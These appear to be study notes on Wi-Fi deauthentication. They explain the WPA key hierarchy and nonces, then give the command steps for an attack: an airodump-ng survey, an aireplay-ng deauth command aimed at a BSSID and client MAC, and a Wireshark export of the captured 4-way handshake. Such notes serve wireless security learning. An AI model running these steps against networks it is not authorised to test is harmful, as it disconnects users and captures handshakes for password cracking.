#DeAuthentication Theory
  #Components within an access key.

Pre-Shared Key (PSK)
  Either a 256-bit key or is derived from a passphare utilizing the SSID as a "salt".
    #A salt is andom data added to a password or passphrase before it's hashed to make it unique and prevent dictionary or rainbow table attacks.
Pairwise Master Key (PMK)
  Generated from the PSK.
Pairwise Transient Key (PTK)
  Encrypts uni-cast traffic between the AP and the Client dependant on the PMK
Group Master Key (GMK)
  Generated by the Authenticator and used to create the Group Temporal Key (GTK)
Group Temporal Key (GTK)
  Encrypts broacasts and multi-cast traffic. It is shared between all of the clients associated to an AP.
  #The whole process is based on the assumption that the Authenticator (Access Point) and the Supplicant (Client) know the PMK. It is never transmitted.

  #Nonce
ANONCE
  An Access Point-generated random number
SNONCE
  Client-generated random number

  #Both introduce uniqueness/randomness to that session's variables

Two-Terminal Attack -- 1. Targeted Survey and 2. Aireplay-ng / Wireshark screened

#Start a targeted airodump-ng survey with the specific channel and bssid of your target at a minimum.
  -w [filename]
  --gpsd
  --manufacturer
  --wps

  #As well as a notepad to take down specific names needed:
    BSSID
    CH #
    CLIENT MAC

#Aireplay-ng

sudo aireplay-ng -0 [0,1,5] -a [BSSID] -c [Client MAC] [interface]

  #If aireplay-ng indicates that the interface is stuck, run airmon-ng start to set the interface on the correct channel.

sudo airmon-ng start [interface] [Target CH]

  #Once you have received the necessary packets for the 4-way handshake, we will mark all of the consecutive handshakes and a beacon frame for the target BSSID. We will then do:
    #Make sure you remove any filters so you get all of the packets you have marked.

File > Export Specified Packets > Export Marked Packets Only

  #Open it up and confirm that everything was exported correctly.
